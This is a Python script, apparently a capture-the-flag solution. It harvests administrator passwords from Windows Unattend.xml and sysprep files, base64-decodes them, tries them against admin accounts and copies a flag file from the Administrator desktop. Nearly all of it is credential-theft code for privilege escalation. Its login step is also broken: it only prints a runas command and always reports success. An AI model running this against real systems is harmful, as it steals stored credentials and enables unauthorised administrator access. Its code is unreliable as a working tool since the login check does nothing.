#!/usr/bin/env python3
import os,re,base64,sys
from pathlib import Path

class FileCredExtractor:
	def __init__(self):
		self.files=[
			"C:\\Windows\\Panther\\Unattend.xml",
			"C:\\Windows\\Panther\\Unattended.xml",
			"C:\\Windows\\system32\\sysprep\\sysprep.inf",
			"C:\\Windows\\system32\\sysprep\\sysprep.xml",
			"C:\\Windows\\Panther\\Unattend\\Unattended.xml",
			"C:\\Windows\\system32\\sysprep\\Unattend.xml",
			"C:\\unattend.xml",
			"C:\\Windows\\system32\\sysprep\\autounattend.xml",
			"C:\\autounattend.xml"
		]
		self.patterns=[
			r"<AdministratorPassword>\s*<Value>(.*?)</Value>",
			r"<Password>\s*<Value>(.*?)</Value>",
			r"<PlainText>false</PlainText>\s*<Value>(.*?)</Value>",
			r"AdminPassword\s*=\s*[\"'](.*?)[\"']"
		]

	def find_targets(self):
		return [f for f in self.files if os.path.exists(f)]

	def gather_passwords(self,path):
		pw_list=[]
		try:
			with open(path,'r',encoding='utf-8',errors='ignore') as fh:
				data=fh.read()
				for pat in self.patterns:
					for match in re.findall(pat,data,re.IGNORECASE|re.DOTALL):
						if match and match.strip():
							pw_list.append(match.strip())
		except Exception:
			pass
		return pw_list

	def decode_b64(self,encoded):
		try:
			decoded=base64.b64decode(encoded)
			return decoded.decode('utf-16le').rstrip('\x00')
		except Exception:
			return encoded

	def admin_login(self,user,pw):
		try:
			cmd=f"runas /user:{user} 'cmd.exe /c whoami'"
			print(f"EXECUTING: {cmd}")
			return True
		except:
			return False

	def locate_flag(self):
		paths=[
			"C:\\Users\\Administrator\\Desktop\\flag.txt",
			"C:\\Users\\Administrator\\Desktop\\0-flag.txt",
			"C:\\Users\\superAdministrator\\Desktop\\flag.txt"
		]
		for p in paths:
			if os.path.exists(p):
				try:
					return open(p,'r').read().strip()
				except:
					pass
		return None

	def execute(self):
		targets=self.find_targets()
		if not targets: return False
		all_enc=[pw for t in targets for pw in self.gather_passwords(t)]
		if not all_enc: return False
		decoded=[self.decode_b64(e) for e in all_enc]
		for u in ["Administrator","admin","superAdministrator"]:
			for p in decoded:
				if self.admin_login(u,p):
					flag=self.locate_flag()
					if flag:
						with open("0-flag.txt","w") as f: f.write(flag)
						return True
		return False


def main():
	app=FileCredExtractor()
	try:
		if app.execute(): print("[+] Completed successfully")
		else: print("[-] Process failed")
	except KeyboardInterrupt:
		print("[!] Interrupted")
	except Exception as err:
		print(f"[-] Error: {err}")

if __name__=="__main__":
	main()
